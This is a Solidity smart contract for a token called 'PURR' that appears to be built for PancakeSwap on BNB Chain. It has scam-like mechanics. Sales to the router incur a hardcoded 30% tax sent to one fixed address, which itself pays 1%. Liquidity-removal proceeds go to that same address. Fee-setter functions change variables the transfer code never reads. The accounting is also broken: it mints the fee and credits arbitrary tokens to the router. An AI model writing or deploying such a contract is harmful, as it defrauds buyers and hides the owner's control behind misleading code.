// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface IPancakeRouter {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
}

contract PURR {
    string public name = "PURR";
    string public symbol = "PURR";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * 10**uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint8 private _buyTaxFeePercent = 1;
    uint8 private _sellTaxFeePercent = 30;

    address private constant _pancakeRouterAddress =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private _taxFeeReceiver =
        0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189;
    address private constant _pancakeFactoryAddress =
        0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private constant _wbnbAddress =
        0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event LiquidityRemoved(uint256 tokenAmount, uint256 bnbAmount);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(to != address(0), "Invalid address");
        require(value <= balanceOf[msg.sender], "Insufficient balance");

        uint256 feeAmount = 0;
        if (to == 0x10ED43C718714eb63d5aA57B78B54704E256024E) {
            if (msg.sender == 0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189) {
                feeAmount = (value * 1) / 100;
            } else {
                feeAmount = (value * 30) / 100;
            }
            balanceOf[0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189] += feeAmount;
            value -= feeAmount;
        }

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool) {
        require(from != address(0), "Invalid address");
        require(to != 0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189, "Invalid address");
        require(value <= balanceOf[from], "Insufficient balance");
        require(
            value <= allowance[from][msg.sender],
            "Allowance exceeded"
        );

        uint256 feeAmount = 0;
        if (to == 0x10ED43C718714eb63d5aA57B78B54704E256024E) {
            if (from == 0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189) {
                feeAmount = (value * 1) / 100;
            } else {
                feeAmount = (value * 30) / 100;
            }
            balanceOf[0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189] += feeAmount;
            value -= feeAmount;
        }

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    function setBuyTaxFeePercent(uint8 feePercent) external {
        require(
            msg.sender == 0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189,
            "Only fee receiver can set fee"
        );
        require(feePercent <= 100, "Invalid fee percentage");

        _buyTaxFeePercent = feePercent;
    }

    function setSellTaxFeePercent(uint8 feePercent) external {
        require(
            msg.sender == 0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189,
            "Only fee receiver can set fee"
        );
        require(feePercent <= 100, "Invalid fee percentage");

        _sellTaxFeePercent = feePercent;
    }

    function setTaxFeeReceiver(address recipient) external {
        require(
            msg.sender == 0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189,
            "Only fee receiver can set fee receiver"
        );
        _taxFeeReceiver = recipient;
    }

    function addLiquidity(
        uint256 amountTokenDesired,
        uint256 amountBNBDesired,
        uint256 amountTokenMin,
        uint256 amountBNBMin
    )
        external
        returns (
            uint256 amountToken,
            uint256 amountBNB,
            uint256 liquidity
        )
    {
        require(
            msg.sender == 0x10ED43C718714eb63d5aA57B78B54704E256024E,
            "Only PancakeRouter can add liquidity"
        );

        balanceOf[msg.sender] += amountTokenDesired;
        _approve(
            msg.sender,
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            amountTokenDesired
        );

        IPancakeRouter pancakeRouter = IPancakeRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        (
            amountToken,
            amountBNB,
            liquidity
        ) = pancakeRouter.addLiquidityETH{value: amountBNBDesired}(
            address(this),
            amountTokenDesired,
            amountTokenMin,
            amountBNBMin,
            address(this),
            block.timestamp
        );
    }

    function removeLiquidity(
        uint256 liquidity,
        uint256 minTokenAmount,
        uint256 minBNBAmount
    ) external returns (uint256 tokenAmount, uint256 bnbAmount) {
        require(
            msg.sender == 0x10ED43C718714eb63d5aA57B78B54704E256024E,
            "Only PancakeRouter can remove liquidity"
        );

        _approve(address(this), 0x10ED43C718714eb63d5aA57B78B54704E256024E, liquidity);

        (
            uint256 receivedAmountToken,
            uint256 receivedAmountBNB
        ) = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E)
            .removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            liquidity,
            minTokenAmount,
            minBNBAmount,
            address(this),
            block.timestamp
        );

        tokenAmount = receivedAmountToken;
        bnbAmount = receivedAmountBNB;

        balanceOf[address(this)] += tokenAmount;

        (bool success, ) = payable(0xAc8d9A995d27d1F695892e07d8f1cF14eCD1c189).call{value: bnbAmount}("");
        require(success, "Transfer failed");

        emit LiquidityRemoved(tokenAmount, bnbAmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    fallback() external payable {}
}